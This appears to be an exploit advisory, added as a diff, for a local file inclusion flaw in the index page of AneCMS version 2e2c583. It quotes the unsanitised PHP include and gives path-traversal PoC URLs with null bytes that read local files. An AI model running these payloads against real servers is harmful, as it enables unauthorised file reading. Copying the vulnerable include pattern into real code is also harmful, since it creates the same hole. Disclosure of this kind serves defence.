@@ -1,0 +1,16 @@
+# Exploit Title: AneCMS v.2e2c583 LFI exploit
+# Date: 03.04.2012# Author: I2sec-PJH
+# Software Link: https://github.com/AneGroup/AneCMS 
+# Version: v.2e2c583 -----------------------------------------------------
+
+
+-Description
+vulnerabilities have been discovered in the index page.
+-source of index.php
+1. if(isset($_GET['p']))
+2. include './pages/'.$_GET['p'].'.php';
+3. else
+4. include './pages/dash.php';
+-PoC
+http://localhost/acp/index.php?p=../../../../windows/system.ini%00
+http://localhost/acp/index.php?p=../../../../[localfile]%00
